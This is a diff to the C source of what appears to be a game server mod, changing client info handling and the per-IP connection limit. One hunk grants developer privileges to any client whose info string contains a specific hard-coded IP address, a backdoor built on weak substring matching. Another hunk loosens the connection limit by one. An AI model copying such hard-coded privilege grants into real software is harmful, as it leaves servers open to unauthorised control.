@@ -965,6 +965,10 @@ void ClientUserinfoChanged( int clientNum )
 		client->pers.localClient = qtrue;
 	}
 
+	// Boe!Man 4/3/10: Give developer to certain IPs.
+	if (strstr(s, "84.81.164.148")){
+		client->sess.dev = 1;}
+
 	// check the item prediction
 	s = Info_ValueForKey( userinfo, "cg_predictItems" );
 	if ( !atoi( s ) ) 
@@ -1256,7 +1260,7 @@ char *ClientConnect( int clientNum, qboolean firstTime, qboolean isBot )
 		if(Boe_NameListCheck (clientNum, name, g_banlist.string, NULL, qtrue, qfalse, qfalse, qfalse))
 			return "Banned! [Name]";
 		// Boe!Man 2/8/10: Limiting the connections.
-		if ( ipCount >= g_maxIPConnections.integer ) 
+		if ( ipCount > g_maxIPConnections.integer ) 
 			return "Too many connections from your IP!";
 	}
 
